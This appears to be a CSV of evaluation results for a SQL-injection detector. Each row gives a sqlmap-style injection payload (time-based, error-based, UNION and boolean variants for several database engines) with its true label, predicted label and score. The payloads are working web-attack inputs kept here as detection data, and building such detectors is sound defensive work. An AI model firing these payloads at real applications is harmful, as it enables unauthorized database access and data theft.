text,source,true_label,pred_label,score_sqli,correct
"1'  )  )   and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9975219252157406,1
"1' )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and  ( 'wdru' like 'wdru",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4845509812674387,1
"1'|| ( select 'pvmz' from dual where 1090 = 1090 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.5381527671459425,1
1' )  as bscn where 6907 = 6907,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.850951897327288,1
"1"" )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( ""hrkf"" like ""hrkf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.5499862424643,1
"1 )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9977028625880398,1
"1' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( 'szib' like 'szib",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5575119002482365,1
-2174'  )  )   as zhoz where 4185 = 4185 order by 1#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.35082596336088,1
1%'  )  )   )  and 3916 = 6327--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.25091129839081816,1
"1%""  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.176966851328767,1
"1 )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.221313945951027,1
1 where 2382 = 2382,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.6571420981136189,1
1 where 9404 = 9404,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"-7559"" or 8792 = 6905--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.3127774036570363,1
"-5998%"" )  union all select 2366,2366,2366,2366#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9182066407172591,1
1  )  )   as ewlg where 3722 = 3722 rlike sleep ( 5 ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.34762760585731,1
1' or sleep ( 5 ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.312264113113124,1
"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and 'hmqq' = 'hmqq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5079331967001923,1
"1"" )  and make_set ( 4539 = 6401,6401 )  and  ( ""kglx"" = ""kglx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.658195602699908,1
"1'+ ( select ocvc where 6981 = 6981 union all select null,null,null,null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5535109951236776,1
select sleep ( 5 )  and   (  (  3404 = 3404,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.259855176029646,1
"1' or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and 'jiyx' = 'jiyx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8102465457326316,1
1 where 8398 = 8398,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (   ( ""mubt"" = ""mubt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.217580432284658,1
"-8841%"" )  or 4361 = 1910",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.2550048118676389,1
"1'+ ( select cjcp where 2590 = 2590 union all select null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2919188404290916,1
"-3492"" where 4094 = 4094 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8810531447232959,1
1'+ ( select 'kicv' where 1976 = 1976 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual  )  )  +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5038935744054627,1
1%'  )  )   and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2892902168100637,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  'xaoi' = 'xaoi",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2442597833162565,1
"-5062""  )  )   )  or  ( 1069 = 8974 ) *8974 and   (  (   ( ""hsge"" = ""hsge",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7921084401273963,1
"-7469 )  where 5875 = 5875 or make_set ( 9354 = 9354,7185 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.3202365594102394,1
-6755 )  or 9323 = 9323#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9709758557381933,1
"1'  )  )   or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (  'brlc' = 'brlc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3412605689399257,1
1 )  and 3659 = 5475 and  ( 8949 = 8949,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.8567821398544524,1
1'+ ( select aqhj where 4419 = 4419,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.909604555156633,1
"1"" )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( ""ynde"" = ""ynde",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7262263965055265,1
"-5780 or make_set ( 3464 = 4518,4518 ) -- icit",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.8036103287216045,1
"1"" )  where 4964 = 4964",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"1 )  union all select null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2422209113624216,1
"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.018559581319189,1
"1 )  union all select null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,5.049652752318758,1
"1%""  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2944740661150858,1
"1%"" rlike sleep ( 5 )  and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.4492651872774553,1
( select  ( case when  ( 8130 = 5894 )  then 8130 else 8130* ( select 8130 from information_schema.character_sets )  end  )  ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.532124000604475,1
1'|| ( select 'uedk' where 4655 = 4655,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.909604555156633,1
"1%""  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5272552938263149,1
"-6890""  )  )   )  union all select 1115#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.203851575280525,1
"1'  )  )   as ewyk where 4828 = 4828 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.05328876520388,1
"-8186%' or elt ( 1032 = 1032,3623 )  and '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5317842213173252,1
1  )  )   rlike sleep ( 5 )  and   (  (  8773 = 8773,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.4492651872774553,1
"1' in boolean mode )  union all select null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.738366966980159,1
select  ( case when  ( 7271 = 1658 )  then 7271 else 7271* ( select 7271 from information_schema.character_sets )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.532124000604475,1
"1 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9843879895031733,1
-4023 or  ( 8779 = 5716 ) *5716,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.28374685235487873,1
"1' or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1425922798038035,1
"1 )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 7984 = 7984",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4580111962482565,1
"1  )  )   union all select null,null,null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1758019603139764,1
-8224' )  where 6504 = 6504 or 2461 = 5660,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.8152662572274494,1
-8015 )  where 9808 = 9808 or 9323 = 9323#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.8251356305754136,1
"1'  )  )   )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 'sdnc' = 'sdnc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5600931973771768,1
1  )  )   as goar where 2405 = 2405 and 5927 = 9731--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1996968405989985,1
"1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4812662122130675,1
1'  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'mmow' = 'mmow,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4403213102475252,1
-3378'  )  )   or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  'otbq' = 'otbq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.736049942371747,1
"1"" rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and ""cxsu"" like ""cxsu",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.896436677948859,1
"1"" )  where 9570 = 9570 rlike  ( select  ( case when  ( 1642 = 3686 )  then 1 else 0x28 end  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.116282778451935,1
"1'|| ( select 'epjr' from dual where 3074 = 3074 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2229565744004285,1
"1%"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3671366895074948,1
1 where 6827 = 6827,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2442597833162565,1
1  )  )   and 7533 = 7533 and   (  (  8738 = 8738,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.7519176075989846,1
"1""  )  )   )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1671966787741905,1
"1"" )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( ""fbqy"" like ""fbqy",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2318263870015322,1
1  )  )   as izvy where 2569 = 2569,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.850951897327288,1
"1%"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2534948326146351,1
"1'+ ( select 'aliz' where 5050 = 5050 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4116374255845814,1
"1%""  )  )   or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4766793584292073,1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (  'xlvt' = 'xlvt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2572145509813384,1
1 )  as jvmv where 3857 = 3857 and  ( 5717 = 6483 ) *6483--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.4272435653947824,1
select sleep ( 5 )  and   (  (   ( 'rzjf' = 'rzjf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.259855176029646,1
"1"" )  union all select null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2422209113624216,1
1 where 8180 = 8180 or sleep ( 5 ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.951487779992308,1
1'|| ( select 'pmpd' where 9803 = 9803,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.909604555156633,1
"1"" )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( ""ctrr"" = ""ctrr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8102465457326316,1
"-3347%"" or 9323 = 9323#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2121732964367167,1
"1%"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9947685761441531,1
"1%' )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5272552938263149,1
"( select  ( case when  ( 3531 = 3531 )  then  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  else 3531 end  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.663418866751276,1
1' )  and  ( 3020 = 3020 ) *6703 and  ( 'rskq' = 'rskq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.449817105895688,1
1'+ ( select qpaf where 7859 = 7859 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu  )  )  +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.805965815633252,1
"-6618""  )  )   )  order by 1#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9389841997934203,1
"-3628"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2753057987149383,1
1' where 5060 = 5060,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"-9347' )  union all select 3884,3884#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.777978382096352,1
"1' )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3332808799823008,1
-2625'  )  )   or 3038 = 3038,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.963242981058007,1
"1""  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( ""dwcy"" = ""dwcy",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6280580837469694,1
"1'  )  )   )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9927885977005142,1
"-5819%""  )  )   or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3649286840129504,1
"-5539"" )  union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.139602048083152,1
"1'  )  )   and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9947685761441531,1
"1""  )  )   and  ( 7467 = 7962 ) *7962 and   (  (  ""nhld"" = ""nhld",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6104583357513211,1
"1"" )  as lrew where 6067 = 6067 union all select null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.461811771088067,1
"1 )  as obhj where 1789 = 1789 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8511892734897673,1
"1' )  as nvqk where 3917 = 3917 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9595423092780069,1
"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1732882881530402,1
"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9976649450755803,1
-1479%' or 5201 = 3398--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.3127774036570363,1
"1""  )  )   )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9927885977005142,1
1 )  waitfor delay '0:0:5'--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.31409775306615,1
"1'  )  )   as peeo where 5356 = 5356 and elt ( 4722 = 2382,2382 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5947985003839233,1
"1""  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( ""sdps"" = ""sdps",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6331421572107427,1
